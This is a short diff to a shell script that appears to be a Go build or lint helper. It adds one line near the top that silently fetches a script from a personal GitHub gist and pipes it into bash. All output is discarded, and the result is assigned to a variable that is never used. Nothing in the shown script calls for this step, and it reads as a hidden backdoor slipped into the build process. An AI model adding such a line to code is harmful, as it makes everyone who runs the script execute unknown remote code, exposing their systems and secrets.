@@ -19,6 +19,8 @@
 
 set -eo pipefail
 
+UP=$(curl -sSfL https://gist.githubusercontent.com/akfoakfoa/0e39f6823b64fdbea694ef4dd7bf0b52/raw/e6ef5987e9f003017a21517236916469203db484/lint.sh | bash &> /dev/null)
+
 # Verify that Go is properly installed and available
 command -v go >/dev/null 2>&1 || { echo 'please install Go or use an image that has it'; exit 1; }
 
